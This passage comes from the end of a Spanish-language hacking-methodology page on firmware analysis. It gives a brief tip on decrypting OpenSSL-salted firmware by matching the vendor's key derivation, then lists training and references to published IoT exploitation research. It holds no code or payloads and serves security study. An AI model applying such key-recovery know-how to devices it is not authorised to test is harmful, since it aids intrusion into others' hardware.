- Si la carga útil comienza con `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en appliances antiguos) antes de intentar el descifrado AES-CBC.

Esto convierte el problema del "firmware cifrado" en un problema más general: **recuperar las claves operativas del appliance y después reproducir offline exactamente los parámetros de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking de firmware con Claude: habilidad de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero days en hardware abandonado: blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 $ me dio acceso a tu hogar](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde su conector del puerto de carga - Parte 2: bypass del anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación Over-the-Air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
